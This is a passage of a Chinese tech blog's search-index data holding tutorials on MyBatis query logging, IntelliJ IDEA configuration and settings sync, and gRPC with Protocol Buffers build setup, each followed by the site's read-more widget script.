Preparing: INSERT INTO t_employee ( last_name, gender, email, age ) VALUES ( ?, ?, ?, ? )==&gt; Parameters: David(String), 1(String), david@gmail.com(String), 23(Integer)&lt;== Updates: 1insert result: 1==&gt; Preparing: SELECT id,last_name,gender,email,age FROM t_employee WHERE id=?==&gt; Parameters: 1(Long)&lt;== Columns: id, last_name, gender, email, age&lt;== Row: 1, Jim, 1, jim@gmail.com, 26&lt;== Total: 1Employee [id=1, lastName=Jim, gender=1, email=jim@gmail.com, age=26]==&gt; Preparing: select id, last_name as lastName, gender, email, age from t_employee where id = ?==&gt; Parameters: 1(Long)&lt;== Columns: id, lastName, gender, email, age&lt;== Row: 1, Jim, 1, jim@gmail.com, 26&lt;== Total: 1Employee [id=1, lastName=Jim, gender=1, email=jim@gmail.com, age=26] var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"IDEA 之五同步配置",url:"/posts/69ad1320.html",text:'IntelliJ IDEA 同步配置 IntelliJ IDEA 支持安装在不同计算机上的 IntelliJ IDEA（或其他基于 IntelliJ 平台的）产品的不同实例之间共享 IDE 设置。如果安装了多个 IntelliJ IDEA，或者希望在团队成员或公司范围内实施相同的设置，这将非常有用。IntelliJ IDEA 为此提供了 Settings Repository 与 IDE Settings Sync 插件，这两款插件默认情况下处于激活状态，如果插件没有激活，可以在插件配置中找到它们，并设置为可用状态。值得一提的是，目前的同步插件不支持同步已安装插件的信息。共享 IDE 设置的具体步骤如下： 在任何 Git 托管服务上创建仓库用于存储 IntelliJ IDEA 的配置文件，例如 GitHub 或 Gitlab。 如果使用 Github 作为 托管服务，需要创建 Personal Access Token，创建教程点这里，创建 Access Token 时赋予 repo 的所有权限即可。 在要共享其配置文件的 IntelliJ IDEA 实例里，导航到 File –&gt; Settings Repository，指定上面创建的远程仓库的 URL，根据提示信息填写 Access Token，然后点击 “Overwrite Remote”，将配置文件 Push 到远程仓库。 在要使用远程配置文件的其他 IntelliJ IDEA 实例里，导航到 File –&gt; Settings Repository，指定上面创建的远程仓库的 URL，根据提示信息填写 Access Token，然后点击 “Overwrite Local”，将配置文件 Pull 到本地。如果想同时保留远程设置和本地设置，可以点击 “Merge”，一旦检测到任何冲突，可以在显示的对话框中解决冲突。如果想本地配置覆盖远程配置，可以点击 “Overwrite Remote”。 如果要禁用自动同步配置，导航到：IDEA 配置中心 –&gt; Tools –&gt; Settings Repository，取消勾选 Auto Sync 选项。当需要同步远程的配置时，可以导航到：主菜单 –&gt; VCS –&gt; Sync Settings 来手动同步。 IntelliJ IDEA 同步配置之共享 IDE 认证 IntelliJ IDEA 在第一次同步时，将会提示输入访问远程仓库的用户名和密码，建议使用 Access Token 进行 GitHub 身份验证。如果由于某种原因，想要使用用户名和密码而不是 Access Token，或者使用的 Git 托管服务提供商不支持它，建议配置 Git 凭证助手。请注意 MacOS Keychain 是受支持的，这意味着可以在所有基于 IntelliJ 平台的产品之间共享凭据（如果原始 IDE 与请求方 IDE 不同，系统将提示授予访问权限）。 IntelliJ IDEA 同步配置之与配置只读源 除了 Settings Repository，还可以配置任何数量的其他存储库，其中就包含需要共享的任何类型的设置，包括实时模板、文件模板、方案、部署选项等。这些存储库被称为只读源，因为它们不能被覆盖或合并，仅用作设置源。要配置此类存储库，导航到：IDEA 配置中心 –&gt; Tools –&gt; Settings Repository，单击 “+” 并添加要存储共享设置的 GitHub 仓库的 URL 即可。只读源中的配置进行同步的方法与 Settings Repository 同步的方法相同。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"IDEA 之四创建静态和动态 Web 项目",url:"/posts/6960eed1.html",text:'IntelliJ IDEA 创建静态 Web 项目 IntelliJ IDEA 创建动态 Java Web 项目 IntelliJ IDEA 部署动态 Java Web 项目到本地 Tomcat 在 IDEA 中配置 Tomcat 之前，需要保证本地已经下载了 Tomcat。 添加本地 Tomcat 服务器 配置 Tomcat 的名称和本地位置 设置要启动的浏览器、项目访问地址以及 Tomcat 监听的端口号 部署动态 Java Web 项目到 Tomcat 启动 Tomcat Tomcat 启动后输出的日志信息 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"IntelliJ IDEA 之三常用配置与使用",url:"/posts/cc0ea4f8.html",text:'IntelliJ IDEA 设置代码补全模版 IntelliJ IDEA 设置代码模版 官方常用 Java 代码模版的使用方式如下： 12345678910111213141516171819202122232425fori：输出 For 循环的代码结构itar：输出完整的 For 循环代码结构iter：输出增强 For 循环的代码结构ifn：输出判断上一个变量是否为空的代码inn：输出判断上一个变量是否不为空的代码xx.nn：输出判断指定变量是否不为空的代码xx.null：输出判断指定变量是否为空的代码psvm：输出 Main 方法psf：输出 public static finalprsf：输出 private static finalpsfi：输出 public static final intpsfs：输出 public static final Stringlist.fori：输出遍历集合变量的 For 循环代码结构list.for：输出遍历集合变量的增强 For 循环代码结构list.forr：输出倒序遍历集合变量的 For 循环代码结构souf：输出 System.out.printf()sout：输出 System.out.println()xx.sout：输出指定变量的值： System.out.println(xx)soutm：输出方法名：System.out.println("Util.hexDecode");soutp：输出方法参数：System.out.println("hex = [" + hex + "]");soutv：输出上一个变量的值：System.out.println("bytes = " + bytes); IntelliJ IDEA 新增自定义代码模版 IntelliJ IDEA 设置代理 IntelliJ IDEA 设置应用程序的 JVM 使用代理 JVM 只支持 Http 代理，不支持 Socket 代理 界面操作路径：选中工程 –&gt; Run –&gt; Edit Configurations –&gt; Application JVM 配置参数示例： -Dhttp.proxyPort=8118 -Dhttp.proxyHost=127.0.0.1 -Dhttps.proxyPort=8118 -Dhttps.proxyHost=127.0.0.1 -Dhttp.nonProxyHosts=”localhost|127.0.0.1|*.aliyun.com” IntelliJ IDEA 常用断点调试技巧 IntelliJ IDEA 支持条件断点，即在断点调试的时候，在循环里增加条件判断，这样可以极大地提高断点调试效率。具体操作方法：在断点处右击调出条件断点设置窗口，填写条件（必须是返回布尔型的结果），然后在 Debug 模式下重新启动应用，就可以在满足某个条件下实施断点调试。在 IntelliJ IDEA 里进行断点调试时，还可以使用查看表达式的值（ctrl + u）来调试代码。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"IntelliJ IDEA 之二常用配置与使用",url:"/posts/bdfd19bb.html",text:'IntelliJ IDEA 切换主题 更多主题可以从这里获取，主题下载以后，导入主题 (方式一) file –&gt; import setttings –&gt; 选中已下载的主题 Jar 文件 –&gt; 一路确认 –&gt; 重启。IDEA 重启以后，新主题会自动启用。另外一种方式是通过插件来更换主题，例如喜欢黑色主题的话，可以在线安装插件 “Material Theme”，安装完之后重启 IDEA，新的主题就会启用。如果对安装的主题插件不满意，还可以找到此插件，进行卸载并重启 IDEA 即可。默认主题的切换方式如下图： IntelliJ IDEA 设置使用鼠标滚轮修改字体大小 勾选此设置后，可以使用 Ctrl + 鼠标滚轮的快捷键来控制代码字体的大小。 IntelliJ IDEA 设置鼠标悬浮显示文档提示 IntelliJ IDEA 设置自动导包 “Add unambiguous imports on the fly”，表示自动导入不明确的结构，”Optimize imports on the fly”，表示自动优化导入的包。 IntelliJ IDEA 设置显示行号 IntelliJ IDEA 设置代码提示忽略大小写 IntelliJ IDEA 的代码提示和补全功能有一个区分大小写的特性，而且默认就是 “First letter only” 区分大小写的。区分大小写的情况是这样的，比如在 Java 代码文件中输入 stringBuffer，IntelliJ IDEA 默认是不会有代码提示或者代码补全的，但是如果输入 StringBuffer 就可以进行代码提示和代码补全。为了方便开发，可以选择不区分大小写，配置方法如下图： IntelliJ IDEA 设置取消单行显示 Tab 在同时打开很多文件的时候，IntelliJ IDEA 默认是把所有打开的 Tab 进行单行显示的。但是多行显示效率比单行显示高，因为单行显示会隐藏超过界面那部分的 Tab，这样找文件很不方便。 IntelliJ IDEA 设置默认的字体、字体大小、字体行间距 IntelliJ IDEA 设置当前主题的字体、字体大小、字体行间距 IntelliJ IDEA 设置代码注释的字体颜色 Doc Comment - Text：修改文档注释的字体颜色 Block comment：修改多行注释的字体颜色 Line comment：修改单行注释的字体颜色 **IntelliJ IDEA 设置超过指定 import 个数则改为 import *** IntelliJ IDEA 修改类头的文档注释信息 常用的预设变量列表如下： 123456789101112131415${PACKAGE_NAME} - the name of the target package where the new class or interface will be created.${PROJECT_NAME} - the name of the current project.${FILE_NAME} - the name of the PHP file that will be created.${NAME} - the name of the new file which you specify in the New File dialog box during the file creation.${USER} - the login name of the current user.${DATE} - the current system date.${TIME} - the current system time.${YEAR} - the current year.${MONTH} - the current month.${DAY} - the current day of the month.${HOUR} - the current hour.${MINUTE} - the current minute.${PRODUCT_NAME} - the name of the IDE in which the file will be created.${MONTH_NAME_SHORT} - the first 3 letters of the month name. Example: Jan, Feb, etc.${MONTH_NAME_FULL} - full name of a month. Example: January, February, etc. IntelliJ IDEA 设置项目文件编码 “Transparent native-to-ascii conversion” 主要用于转换 Ascii，一般都要勾选，不然 Properties 文件中的注释显示的都不会是中文。 IntelliJ IDEA 设置自动编译 Intellij IDEA 默认状态为不自动编译，而 Eclipse 默认为自动编译。 IntelliJ IDEA 开启省电模式 界面操作路径：File –&gt; Power Save Mode，IntelliJ IDEA 开启省电模式之后会关闭代码检查和代码提示等功能。一般也可认为这是一种阅读模式，如果在开发过程中突然遇到代码文件不能进行代码检查和代码提示，可以检查是否开启了省电模式。 IntelliJ IDEA 设置文件内容水平或垂直显示 IntelliJ IDEA 设置快捷为 Eclipse 的快捷键 IntelliJ IDEA 修改快捷键设置 IntelliJ IDEA 通过快捷键进行匹配，查看或修改其他功能的快捷键 IntelliJ IDEA 设置不折叠显示代码 IntelliJ IDEA 设置不检查单词拼写 IntelliJ IDEA 导入已有的快捷键配置 当 IntelliJ IDEA 配置好所有自己熟悉的快捷键之后，可以将快捷键的配置导出为 Jar 文件，方便在下次迁移开发环境时无需重新配置。这里给出一份 IntelliJ IDEA 的快捷键配置文件，目前已经将 IntelliJ IDEA 的快捷键都设置为 Eclipse 常用的快捷键，方便 Eclipse 重度用户快速上手使用 IntelliJ IDEA 进行开发。配置文件的下载地址在这里，具体的快捷键说明可以查看图片 1、图片 2。 IntelliJ IDEA 取消在线检测更新 IntelliJ IDEA 取消未使用的方法警告 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"IntelliJ IDEA 之一常用配置与使用",url:"/posts/b5897f52.html",text:'IntelliJ IDEA 介绍 JetBrains 是一家捷克的软件开发公司，IntelliJ IDEA 是该公司旗下赫赫有名的 IDE 产品，支持目前主流的技术和框架，擅长企业应用、移动应用和 Web 应用的开发。IntelliJ IDEA 目前有两个版本，分别是社区版（免费）与旗舰版（收费），社区版支持 JavaSE、Android、Kotlin、Groovy、Scala 开发，旗舰版额外支持 JavaEE 开发。IntelliJ IDEA 和 Eclipse 一样有强大的插件系统支持，官方的插件可以从这里获取。 IntelliJ IDEA 的 config 与 system 目录 启动 IntelliJ IDEA 后会自动生成一个全新的默认配置，配置目录的位置分别是 /.IntelliJIdea2019.1/config、/.IntelliJIdea2019.1/system。其中 config 目录是 IntelliJ IDEA 个性化的配置目录，或者说是整个 IDE 的设置目录，该目录主要记录了 IDE 主要配置功能、插件功能、自定义的代码模板、自定义的文件模板、自定义的快捷键、Project 的 tasks 记录等等个性化设置。system 目录是 IntelliJ IDEA 的系统文件目录，是 IntelliJ IDEA 与开发项目的一个桥梁，里面主要有缓存、索引、容器文件输出等等，虽然不是最重要目录，但也是最不可或缺的目录之一。 12345# Linux下重置IDEA的所有配置$ rm -rf ~/.config/JetBrains$ rm -rf ~/.local/share/JetBrains$ rm -rf ~/.IntelliJIdea2019.1/config$ rm -rf ~/.IntelliJIdea2019.1/system IntelliJ IDEA 中 Project 与 Module 的概念 在 Eclipse 中有 Workspace（工作空间）和 Project（工程）的概念，在 IntelliJ IDEA 中只有 Project（工程）和 Module（模块）的概念，IntelliJ IDEA 中 Project 是最顶级的级别，次级别是 Module。这里的对应关系为，Eclipse 中 Workspace 相当于 IDEA 中的 Project，Eclipse 中 Project 相当于 IDEA 中的 Module。Eclipse 可以在同一个窗口管理 N 个项目，这在 IntelliJ IDEA 是无法做到的。IntelliJ IDEA 提供的解决方案是打开多个项目实例，即打开多个项目窗口，即一个 Project 打开一个 Window 窗口。 IntelliJ IDEA 对版本控制工具的支持 很多人认为 IntelliJ IDEA 自带了 SVN 或者 Git 等版本控制工具，认为只要安装了 IntelliJ IDEA 就可以完全使用版本控制应有的功能。这完全是一种错误的解读，IntelliJ IDEA 是自带对这些版本控制工具的插件支持，但是该装什么版本控制客户端还是要照样装的，这一点和 Eclipse 是一样的。在 Window 环境下，经常使用的 Git 客户端有 msysGit、TortoiseGit 等。IntelliJ IDEA 对版本控制的支持是以插件化的方式来实现的，旗舰版默认支持目前主流的版本控制软件，例如 CVS、Git、Subversion (SVN)、Mercurial、Perforce、GitHub。 IntelliJ IDEA 支持本地文件历史的记录 当项目中没有使用版本控制功能，IntelliJ IDEA 也默认提供了本地文件历史记录。界面操作路径：选中文件 –&gt; Local History –&gt; Show History IntelliJ IDEA 调整 VM 配置文件 根据电脑系统的位数，选择修改 32 位的 VM 配置文件（idea.vmoptions）或者 64 位的 VM 配置文件（idea64.vmoptions） 32 位操作系统内存不会超过 4G，因此没有多大空间可以调整，建议不用调整 64 位操作系统中 8G 内存以下的机子或者是静态页面的开发者，建议不用调整 64 位操作系统且内存大于 8G 的，如果是开发大型项目、Java 项目或者是 Android 项目，建议进行修改，经常修改的就是下面三个参数 如果正在使用 Eclipse / MyEclipse，想通过 IntelliJ IDEA 来解决计算机的卡、慢等问题，这基本上是不可能的，事实上 IntelliJ IDEA 更占用系统资源 1234567891011# 默认配置的内容如下，配置文件所在目录：$idea-root/bin/-Xms128m-Xmx512m-XX:ReservedCodeCacheSize=240m-XX:+UseConcMarkSweepGC-XX:SoftRefLRUPolicyMSPerMB=50# 配置调整的建议-Xms128m，16G内存的机器可尝试设置为 -Xms512m，用于设置初始的内存数，提高该值可以提高Java程序的启动速度-Xmx750m，16G内存的机器可尝试设置为 -Xmx2048m，用于设置最大内存数，提高该值可以减少GC执行的频率，提高程序性能-XX:ReservedCodeCacheSize=240m，16G内存的机器可尝试设置为 -XX:ReservedCodeCacheSize=1024m，用于保留代码占用的内存容量 IntelliJ IDEA 缓存和索引的清理 IntelliJ IDEA 首次加载项目的时候，都会创建索引，而创建索引的时间跟项目的文件多少成正比。在 IntelliJ IDEA 创建索引过程中即使编辑了代码也是编译不了、运行不起来的，只能等 IntelliJ IDEA 创建索引完成。IntelliJ IDEA 的缓存和索引主要是用来加快文件查询，从而加快各种查找、代码提示等操作的速度。但是在某些特殊条件下，IntelliJ IDEA 的缓存和索引文件也是会损坏的，比如：断电、蓝屏引起的强制关机，当重新启动 IntelliJ IDEA，很可能 IntelliJ IDEA 会报各种莫名其妙错误，甚至项目打不开，IntelliJ IDEA 主题还原成默认状态。即使没有断电、蓝屏的情况发生，也会有莫名奇怪的问题的时候，也很有可能是 IntelliJ IDEA 缓存和索引出现了问题，这种情况还不少，遇到此类问题可以尝试清理缓存和索引。 一般建议点击 “Invalidate and Restart”，这样会清理得比较干净。 清除索引和缓存会使得 IntelliJ IDEA 的 Local History 丢失，所以如果项目没有加入到版本控制，而又需要保留项目文件的历史版本记录，那最好备份下 LocalHistory 目录，该目录位置在: ～/.IntelliJIdea14/system/LocalHistory。 通过上面的方式清除缓存与索引，本质也就是去删除 system 目录下对应的文件而已，所以如果不用上述方法也可以先关闭 IntelliJ IDEA，然后直接删除整个 system 目录。当 IntelliJ IDEA 重启的时候，会自动重新创建新的 system 目录以及项目对应的缓存和索引。 IntelliJ IDEA 的 Database 功能 配置 Database 就是为了有一个 GUI 管理数据库功能，但是这并不是 IntelliJ IDEA 的 Database 最重要特性。数据库的 GUI 工具有很多，IntelliJ IDEA 的 Database 也没有太明显的优势。Database 最大的特性就是针对 Java Web 项目经常使用的 ORM 框架，如 Hibernate、Mybatis 有很好的支持，比如配置好了 Database 之后，IntelliJ IDEA 会自动识别 Domain 对象与数据表的关系，也可以通过 Database 的数据表直接生成 Domain 对象等。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"gRPC 基础教程之二",url:"/posts/f534d182.html",text:'SpringBoot 整合 gRPC Gitee Demo 代码 grpc-spring-boot-starter github grpc-spring-boot-starter 中文文档 gRPC 的四种服务类型定义 一个简单 RPC，客户端使用存根发送请求到服务器并等待响应返回，就像平常的函数调用一样。 1rpc GetFeature(Point) returns (Feature) {} 一个服务器端流式 RPC，客户端发送请求到服务器，拿到一个流去读取返回的消息序列。客户端读取返回的流，直到里面没有任何消息。通过在响应类型前插入 stream 关键字，可以指定一个服务器端的流方法。 1rpc ListFeatures(Rectangle) returns (stream Feature) {} 一个 客户端流式 RPC，客户端写入一个消息序列并将其发送到服务器，同样也是使用流。一旦客户端完成写入消息，它等待服务器完成读取返回它的响应。通过在请求类型前指定 stream 关键字来指定一个客户端的流方法。 1rpc RecordRoute(stream Point) returns (RouteSummary) {} 一个双向流式 RPC 是双方使用读写流去发送一个消息序列。两个流独立操作，因此客户端和服务器可以以任意喜欢的顺序读写：比如，服务器可以在写入响应前等待接收所有的客户端消息，或者可以交替地读取和写入消息，或者其他读写的组合，每个流中的消息顺序都会被预留。通过在请求和响应前加 stream 关键字去制定方法的类型。 1rpc RouteChat(stream RouteNote) returns (stream RouteNote) {} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式"},{title:"gRPC 基础教程之一",url:"/posts/ceb4ff2b.html",text:'前言 本文将介绍 gRPC、Protocol Buffers 的概念，同时会给出 Protocol Buffers 代码生成器的使用教程，还有编写第一个基于 gRPC 的服务提供者与服务消费者的示例程序。 相关站点 gRPC Github gRPC 英文文档 gRPC 中文文档 gRPC-Java Github gRPC-Java 示例代码 Protocol Buffers 官网 Protocol Buffers Github Protocol Buffers 英文文档 gRPC 简介 gRPC 是一个高性能、开源和通用的 RPC 框架，面向移动和 HTTP/2 设计。目前提供 C、Java、Go 语言版本，分别是：grpc、grpc-java、grpc-go，其中 C 版本支持 C、C++、Node.js、Python、Ruby、Objective-C、PHP、C#。gRPC 基于 HTTP/2 标准设计，带来诸如双向流、流控、头部压缩、单 TCP 连接上的多复用请求等特性。在 gRPC 里客户端应用可以像调用本地对象一样直接调用另一台不同的机器上服务端应用的方法，更容易地创建分布式应用和服务。与许多 RPC 系统类似，gRPC 也是基于以下理念：定义一个服务，指定其能够被远程调用的方法（包含参数和返回类型）。在服务端实现这个接口，并运行一个 gRPC 服务器来处理客户端调用。在客户端拥有一个存根能够像服务端一样的方法。值得说明的是，gRPC 客户端和服务端可以在多种环境中运行和交互，支持用任何 gRPC 支持的语言来编写，所以可以很容易地用 Java 创建一个 gRPC 服务端，用 Go、Python、Ruby 来创建客户端。 使用 Protocol Buffers gRPC 默认使用 Protocol Buffers，这是 Google 开源的一套成熟的结构数据序列化机制（当然也可以使用其他数据格式如 JSON）。当使用 proto files 创建 gRPC 服务，用 Protocol Buffers 消息类型来定义方法参数和返回类型。尽管 Protocol Buffers 已经存在了一段时间，官方的示例代码种使用了一种名叫 proto3 的新风格的 Protocol Buffers，它拥有轻量简化的语法、一些有用的新功能，并且支持更多新语言。当前针对 Java 和 C++ 发布了 beta 版本，针对 JavaNano（即 Android Java）发布 alpha 版本，在 Protocol Buffers Github 源码库里有 Ruby 支持， 在 Github 源码库里还有针对 Go 语言的生成器， 对更多语言的支持正在开发中。虽然可以使用 proto2 (当前默认的 Protocol Buffers 版本)， 通常建议在 gRPC 里使用 proto3，因为这样可以使用 gRPC 支持全部范围的的语言，并且能避免 proto2 客户端与 proto3 服务端交互时出现的兼容性问题，反之亦然。 本地编译安装 Protocol Buffers（可选） 参考自 gRPC-Java、Protobuf 编译构建的官方教程，一般情况下不需要构建 gRPC-Java，只有在对 gRPC-Java 的源码进行了更改或测试使用 gRPC-Java 库的非发布版本（例如 master 分支）时才需要构建。若本地安装了 Protobuf，则可以直接通过命令的方式调用 Protobuf 的代码生成器，无需再依赖额外的 IDE 插件。 1234567891011121314151617181920212223242526272829303132333435363738# 系统环境CentOS Linux release 7.6.1810 (Core)Linux develop 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux# 拉取源码# git clone https://github.com/google/protobuf.git# 进入源码目录# cd protobuf# 切换至需要编译的版本的分支# git checkout v3.7.1# 查看当前所在的分支信息# git branch -v# 检测安装环境# ./autogen.sh# ./configure --disable-shared# 编译安装# make -j 8# make install# 如果/usr/local/lib不在库搜索路径中，可以通过运行以下命令添加# sh -c \'echo /usr/local/lib &gt;&gt; /etc/ld.so.conf\'# 使添加的库搜索路径生效# ldconfig# 查看protobuf安装的版本号# protoc --version# 编写.proto文件，使用protobuf的代码生成器自动生成Java代码，命令格式如下# protoc -I=$SRC_DIR --java_out=$DST_DIR $SRC_DIR/addressbook.proto# 默认安装路径：/usr/local# 指定安装目录可以使用此命令： ./configure --disable-shared --prefix=/usr/local/protobuf-3.7.1 Eclipse 项目中添加 Protobuf 自动生成代码的 Maven 插件与 Protobuf 依赖 Protobuf 的原型文件和一些适合的插件，默认放在 src/main/proto 和 src/test/proto 目录中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;dependency&gt; &lt;groupId&gt;io.grpc&lt;/groupId&gt; &lt;artifactId&gt;grpc-netty-shaded&lt;/artifactId&gt; &lt;version&gt;1.21.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.grpc&lt;/groupId&gt; &lt;artifactId&gt;grpc-protobuf&lt;/artifactId&gt; &lt;version&gt;1.21.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;io.grpc&lt;/groupId&gt; &lt;artifactId&gt;grpc-stub&lt;/artifactId&gt; &lt;version&gt;1.21.0&lt;/version&gt;&lt;/dependency&gt;&lt;build&gt; &lt;extensions&gt; &lt;extension&gt; &lt;groupId&gt;kr.motd.maven&lt;/groupId&gt; &lt;artifactId&gt;os-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.5.0.Final&lt;/version&gt; &lt;/extension&gt; &lt;/extensions&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.xolstice.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;protobuf-maven-plugin&lt;/artifactId&gt; &lt;version&gt;0.5.1&lt;/version&gt; &lt;configuration&gt; &lt;protocArtifact&gt;com.google.protobuf:protoc:3.7.1:exe:${os.detected.classifier}&lt;/protocArtifact&gt; &lt;pluginId&gt;grpc-java&lt;/pluginId&gt; &lt;pluginArtifact&gt;io.grpc:protoc-gen-grpc-java:1.21.0:exe:${os.detected.classifier}&lt;/pluginArtifact&gt; &lt;/configuration&gt; &lt;executions&gt; &lt;execution&gt; &lt;goals&gt; &lt;goal&gt;compile&lt;/goal&gt; &lt;goal&gt;compile-custom&lt;/goal&gt; &lt;/goals&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/build&gt; 往 Gradle 构建的项目添加 Protobuf 自动生成代码的插件与 Protobuf 依赖 1234567891011121314151617181920212223242526plugins { id \'com.google.protobuf\' version \'0.8.8\'}protobuf { protoc { artifact = "com.google.protobuf:protoc:3.7.1" } plugins { grpc { artifact = \'io.grpc:protoc-gen-grpc-java:1.21.0\' } } generateProtoTasks { all()*.plugins { grpc {} } }}dependencies { compile \'io.grpc:grpc-stub:1.21.0\' compile \'io.grpc:grpc-protobuf:1.21.0\' compile \'io.grpc:grpc-netty-shaded:1.21.0\' testCompile group: \'junit\', name: \'junit\', version: \'4.12\'} 编写 Proto 文件（定义服务），执行编译后自动生成 Java 文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465# 创建gradle工程grpc-demo-provider，目录结构如下：grpc-demo-provider/├── build.gradle└── src ├── main │&nbsp;&nbsp; ├── java │&nbsp;&nbsp; ├── proto │&nbsp;&nbsp; │&nbsp;&nbsp; └── helloworld.proto │&nbsp;&nbsp; └── resources └── test ├── java ├── proto └── resources# 进入工程目录# cd grpc-demo-provider# 编辑build.gradle文件，添加protobuf插件与依赖，可参考上面给出的gradle配置内容# 创建proto文件# mkdir -p src/main/proto# vim src/main/proto/helloworld.protosyntax = "proto3";option java_multiple_files = true;option java_package = "com.grpc.demo.generate";option java_outer_classname = "HelloWorldProto";option objc_class_prefix = "HLW";package helloworld;service Greeter { rpc SayHello (HelloRequest) returns (HelloReply) {}}message HelloRequest { string name = 1;}message HelloReply { string message = 1;}# 执行编译，自动生成Java文件# gradle clean build# 查看自动生成的文件目录结构，默认生成文件所在的目录是：$buildDir/generated/source/proto，其中Message在main/java目录下，Service在目录main/grpc下# tree build/generated/source/protomain├── grpc│&nbsp;&nbsp; └── com│&nbsp;&nbsp; └── grpc│&nbsp;&nbsp; └── demo│&nbsp;&nbsp; └── generate│&nbsp;&nbsp; └── GreeterGrpc.java└── java └── com └── grpc └── demo └── generate ├── HelloReply.java ├── HelloReplyOrBuilder.java ├── HelloRequest.java ├── HelloRequestOrBuilder.java └── HelloWorldProto.java Gradle 指定 Protobuf 代码自动生成的目录位置 1234567891011121314151617181920212223242526272829303132333435// 指定Message代码的生成位置，最终生成位置在src/main/java目录下protobuf { generatedFilesBaseDir = "src"}// 指定Service代码的生成位置，最终生成位置在src/main/java目录下protobuf { generateProtoTasks { all()*.plugins { grpc { outputSubDir = \'java\' } } }}// 